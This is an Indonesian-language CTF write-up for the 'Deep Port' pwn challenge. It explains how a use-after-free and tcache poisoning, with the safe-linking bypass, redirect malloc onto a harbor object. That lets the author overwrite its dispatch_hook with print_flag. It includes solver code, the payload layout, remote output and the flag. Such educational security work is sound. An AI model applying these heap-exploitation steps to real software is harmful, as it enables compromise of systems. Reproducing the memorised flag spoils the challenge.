# Deep Port — Pwn Writeup

## Informasi Challenge

| Field | Value |
|---|---|
| Judul | Deep Port |
| Kategori | Pwn |
| Arsitektur | amd64 |
| Bug | Use-After-Free dan tcache poisoning |
| Target | `harbor->dispatch_hook` |
| Flag | `grodno{4cc2c6b7-8468-4472-84e7-e02f838afdbd}` |

## Ringkasan

`release_shipment()` membebaskan buffer manifest, tetapi pointer-nya tetap disimpan di struktur shipment. Menu edit masih menerima pointer tersebut dan menulis ke chunk yang sudah masuk tcache.

Dengan dua chunk berukuran `0x48`, forward pointer tcache dapat dipalsukan agar alokasi berikutnya mengembalikan alamat object `harbor`. Object itu memiliki function pointer `dispatch_hook` pada offset `+0x20` dan path file pada offset `+0x28`.

Setelah hook diarahkan ke `print_flag()` dan route tetap diisi `flag.txt`, menu Dispatch mencetak flag.

---

## Recon

```bash
file deep_port
```

```text
deep_port: ELF 64-bit LSB pie executable, x86-64,
dynamically linked, with debug_info, not stripped
```

Proteksi attachment lokal:

```text
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
```

Binary tidak stripped dan masih membawa debug information. Symbol penting dapat dilihat langsung:

```bash
nm -n deep_port | grep -E 'standby|print_flag|setup|shipment|harbor'
```

```text
0000000000001209 t standby
0000000000001247 t print_flag
000000000000132e t setup
0000000000001588 t create_shipment
0000000000001732 t edit_shipment
0000000000001828 t view_shipment
00000000000019a0 t release_shipment
0000000000001a5f t replace_shipment
0000000000004060 b shipments
0000000000004120 b harbor
```

Menu program:

```text
== Deep Port ==
1. Create shipment
2. Edit shipment
3. View shipment
4. Release shipment
5. Replace shipment
6. Harbor status
7. Dispatch
8. Exit
```

---

## Struktur Data

Debug information memperlihatkan struktur berikut:

```c
typedef struct shipment {
    size_t size;          // +0x00
    char *note;           // +0x08
    unsigned long stamp;  // +0x10
} shipment_t;

typedef struct harbor {
    char banner[0x20];              // +0x00
    void (*dispatch_hook)(void *);  // +0x20
    char route[0x20];               // +0x28
} harbor_t;
```

Ukuran `harbor_t` adalah `0x48`, sama dengan request manifest yang dipakai pada exploit.

Saat setup, program membuat object harbor terlebih dahulu:

```asm
mov    edi, 0x48
call   malloc
mov    [harbor], rax

lea    rdx, [standby]
mov    [rax+0x20], rdx
```

Nilai awalnya kurang lebih:

```text
harbor+0x00 = "Harbor status: calm"
harbor+0x20 = standby
harbor+0x28 = "flag.txt"
```

Fungsi Dispatch melakukan pemanggilan tidak langsung:

```c
harbor->dispatch_hook(harbor);
```

Target akhirnya adalah mengganti `dispatch_hook` dengan `print_flag`.

---

## Information Leak

Menu View mencetak tiga nilai:

```text
Receipt stamp: 0x...
Manifest pointer: 0x...
Encoded next: 0x...
```

`Receipt stamp` berisi address fungsi `standby`, sehingga menjadi code leak. `Manifest pointer` memberi alamat chunk heap secara langsung.

Contoh remote:

```text
Receipt stamp: 0x4012b6
Manifest pointer: 0x2f9bf2f0
```

Dua shipment berukuran sama dialokasikan berurutan:

```text
shipment A = 0x2f9bf2f0
shipment B = 0x2f9bf340
stride     = 0x50
```

Object harbor dialokasikan tepat sebelum keduanya dengan request size yang sama. Alamatnya dapat dihitung:

```python
stride = chunk_b - chunk_a
harbor = chunk_a - stride
```

Hasilnya:

```text
harbor = 0x2f9bf2a0
```

---

## Use-After-Free

Bug berada di `release_shipment()`.

Fungsi tersebut memanggil `free(shipments[idx].note)`, tetapi tidak melakukan:

```c
shipments[idx].note = NULL;
```

Struktur shipment tetap dianggap valid. Menu Edit kemudian membaca data baru ke pointer lama:

```c
read(0, shipments[idx].note, shipments[idx].size - 1);
```

Setelah Release, pointer itu sudah menunjuk chunk tcache. Edit berubah menjadi primitive write ke metadata tcache.

---

## Tcache Safe-Linking

Dua manifest dibuat dengan request `0x48`. Glibc membulatkannya menjadi chunk size `0x50`, sehingga keduanya masuk bin tcache yang sama.

Urutan free:

```text
release A
release B
```

Membentuk free-list:

```text
B → A → NULL
```

Pada glibc modern, pointer `next` di-encode dengan safe-linking:

```c
stored_next = target ^ (chunk_address >> 12);
```

Target yang diinginkan adalah alamat object harbor:

```python
encoded_harbor = harbor ^ (chunk_b >> 12)
```

Nilai itu ditulis ke chunk B melalui UAF Edit:

```python
port.edit(1, p64(encoded_harbor).ljust(0x47, b"P"))
```

Free-list sekarang secara logis menjadi:

```text
B → harbor
```

---

## Mengarahkan `malloc()` ke Harbor

Menu Replace mengalokasikan manifest baru dengan ukuran lama.

Replace pertama mengambil B:

```text
malloc(0x48) → chunk B
```

Karena `next` B sudah dipalsukan, head tcache berikutnya menjadi harbor.

Replace kedua kemudian menghasilkan:

```text
malloc(0x48) → harbor
```

Data replacement sekarang ditulis langsung ke object harbor.

Payload object:

```python
payload = (
    b"Deep Port compromised".ljust(0x20, b"\x00")
    + p64(print_flag)
    + b"flag.txt\x00"
).ljust(0x47, b"\x00")
```

Layout sesudah overwrite:

```text
harbor+0x00 = "Deep Port compromised"
harbor+0x20 = print_flag
harbor+0x28 = "flag.txt"
```

---

## Verifikasi Primitive

Percobaan awal belum mencetak flag karena offset `print_flag` pada attachment lokal berbeda dengan build remote.

Sebelum mencari address target lagi, poisoning diverifikasi dengan mengarahkan hook kembali ke fungsi `standby`, address yang sudah diketahui dari leak:

```python
payload = (
    b"HOOK_OK".ljust(0x20, b"\x00")
    + p64(standby)
    + b"flag.txt\x00"
).ljust(0x47, b"\x00")
```

Output remote:

```text
Queue marker: HOOK_OK
>
HOOK_OK
>
```

`HOOK_OK` muncul pada Harbor Status dan saat Dispatch. Ini membuktikan:

- Perhitungan alamat harbor benar.
- Safe-linking encoding benar.
- Tcache poisoning berhasil.
- Offset `dispatch_hook` adalah `+0x20`.
- Kegagalan sebelumnya hanya berasal dari address `print_flag` yang salah.

---

## Perbedaan Build Lokal dan Remote

Attachment lokal memiliki:

```text
standby    = PIE + 0x1209
print_flag = PIE + 0x1247
delta      = 0x3e
```

Build remote berbeda. Leak remote:

```text
standby = 0x4012b6
```

Delta yang benar pada server adalah:

```text
print_flag - standby = 0x1f
```

Maka:

```text
print_flag = 0x4012b6 + 0x1f
           = 0x4012d5
```

Solver menyediakan argumen agar delta dapat disesuaikan tanpa mengubah exploit heap:

```bash
python3 solve.py HOST PORT --print-flag-delta 0x1f
```

---

## Alur Exploit

```text
setup()
  └─ malloc(0x48) untuk harbor

create shipment A, size 0x48
create shipment B, size 0x48
  └─ leak standby, A, dan B

hitung:
  stride = B - A
  harbor = A - stride

free(A)
free(B)
  └─ tcache: B → A

edit(B)
  └─ B->next = harbor ^ (B >> 12)

replace(B)
  └─ malloc mengambil B

replace(A)
  └─ malloc mengambil harbor
  └─ overwrite dispatch_hook = print_flag
  └─ pertahankan route = "flag.txt"

dispatch()
  └─ harbor->dispatch_hook(harbor)
  └─ print_flag(harbor)
  └─ fopen(harbor->route)
  └─ flag tercetak
```

---

## Bagian Inti Solver

```python
port.create(0, 0x48, b"A" * 0x47)
port.create(1, 0x48, b"B" * 0x47)

standby, chunk_a, _ = parse_view(port.view(0))
_, chunk_b, _ = parse_view(port.view(1))

stride = chunk_b - chunk_a
harbor = chunk_a - stride
print_flag = standby + 0x1F

port.release(0)
port.release(1)

encoded = harbor ^ (chunk_b >> 12)
port.edit(1, p64(encoded).ljust(0x47, b"P"))

port.replace(1, b"X" * 0x47)

payload = (
    b"Deep Port compromised".ljust(0x20, b"\x00")
    + p64(print_flag)
    + b"flag.txt\x00"
).ljust(0x47, b"\x00")

port.replace(0, payload)
port.dispatch()
```

---

## Eksekusi Remote

```bash
python3 solve.py 10.112.0.12 46778 --print-flag-delta 0x1f
```

Output:

```text
[+] standby leak   : 0x4012b6
[+] shipment A     : 0x16e9b2f0
[+] shipment B     : 0x16e9b340
[+] chunk stride   : 0x50
[+] harbor object  : 0x16e9b2a0
[+] print_flag     : 0x4012d5
Flag: grodno{4cc2c6b7-8468-4472-84e7-e02f838afdbd}

<FLAG>grodno{4cc2c6b7-8468-4472-84e7-e02f838afdbd}</FLAG>
```

## Flag

```text
grodno{4cc2c6b7-8468-4472-84e7-e02f838afdbd}
```
